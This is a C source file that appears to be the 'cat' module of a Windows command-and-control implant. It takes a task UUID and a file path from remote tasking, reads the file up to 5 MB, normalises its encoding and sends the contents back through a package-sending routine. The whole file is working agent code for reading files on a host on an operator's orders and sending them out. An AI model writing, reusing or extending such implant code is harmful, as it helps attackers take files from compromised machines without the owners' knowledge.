#include <windows.h>
#include <stdio.h>
#include "cat.h"
#include "../Command.h"
#include "../Utils.h"

BOOL executeCat(PParser arguments)
{
    // 1. Get Task UUID
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (!uuidBytes) return FALSE;

    PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
    memcpy(taskUuid, uuidBytes, uuidLen);
    taskUuid[uuidLen] = '\0';
    LocalFree(uuidBytes);
    
    // 2. Num Args
    UINT32 nbArg = ParserGetInt32(arguments);
    (void)nbArg;

    // 3. Path
    SIZE_T cmdLen = 0;
    PBYTE cmdBytes = ParserGetBytes(arguments, &cmdLen);

    PPackage responseTask = PackageCreate();
    PackageAddByte(responseTask, POST_RESPONSE);
    PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
    PPackage output = PackageCreate();

    if (cmdBytes)
    {
        PCHAR path = (PCHAR)LocalAlloc(LPTR, cmdLen + 1);
        if (path)
        {
            memcpy(path, cmdBytes, cmdLen);
            path[cmdLen] = '\0';
            
            LOG("[*] Reading file: %s", path);
            
            HANDLE hFile = CreateFileA(
                path, 
                GENERIC_READ, 
                FILE_SHARE_READ, 
                NULL, 
                OPEN_EXISTING, 
                FILE_ATTRIBUTE_NORMAL, 
                NULL
            );
            
            if (hFile != INVALID_HANDLE_VALUE)
            {
                DWORD fileSize = GetFileSize(hFile, NULL);
                if (fileSize > 0 && fileSize < 1024 * 1024 * 5) // Cap at 5MB to avoid eating all RAM
                {
                    PBYTE fileBuf = (PBYTE)LocalAlloc(LPTR, fileSize + 1);
                    if (fileBuf)
                    {
                        DWORD bytesRead = 0;
                        if (ReadFile(hFile, fileBuf, fileSize, &bytesRead, NULL))
                        {
                            // Check for BOMs
                            // UTF-16 LE: FF FE
                            if (bytesRead >= 2 && fileBuf[0] == 0xFF && fileBuf[1] == 0xFE)
                            {
                                // Convert UTF-16 LE to UTF-8
                                WCHAR* wideBuf = (WCHAR*)(fileBuf + 2); // Skip BOM
                                int wideLen = (bytesRead - 2) / 2;
                                
                                int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideBuf, wideLen, NULL, 0, NULL, NULL);
                                if (utf8Len > 0)
                                {
                                    PBYTE utf8Buf = (PBYTE)LocalAlloc(LPTR, utf8Len + 1);
                                    if (utf8Buf)
                                    {
                                        WideCharToMultiByte(CP_UTF8, 0, wideBuf, wideLen, (char*)utf8Buf, utf8Len, NULL, NULL);
                                        PackageAddBytesRaw(output, utf8Buf, utf8Len);
                                        LocalFree(utf8Buf);
                                    }
                                }
                            }
                            // UTF-8 BOM: EF BB BF
                            else if (bytesRead >= 3 && fileBuf[0] == 0xEF && fileBuf[1] == 0xBB && fileBuf[2] == 0xBF)
                            {
                                // Skip BOM
                                PackageAddBytesRaw(output, fileBuf + 3, bytesRead - 3);
                            }
                            else
                            {
                                // Normal read
                                PackageAddBytesRaw(output, fileBuf, bytesRead);
                            }
                        }
                        else
                        {
                            char* err = "Failed to read file.";
                            PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
                        }
                        LocalFree(fileBuf);
                    }
                }
                else if (fileSize == 0)
                {
                    char* msg = "[Empty file]";
                    PackageAddBytesRaw(output, (PBYTE)msg, strlen(msg));
                }
                else
                {
                    char* err = "File too large (>5MB).";
                    PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
                }
                CloseHandle(hFile);
            }
            else
            {
                char* err = "Failed to open file.";
                PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
            }
            LocalFree(path);
        }
        LocalFree(cmdBytes);
    }
    else
    {
         char* err = "Missing path.";
         PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
    }

    PackageAddBytes(responseTask, (PBYTE)output->buffer, output->length);
    PParser ResponseParser = sendPackage(responseTask);
    if (ResponseParser) ParserDestroy(ResponseParser);
    PackageDestroy(responseTask);
    PackageDestroy(output);
    LocalFree(taskUuid);

    return TRUE;
}
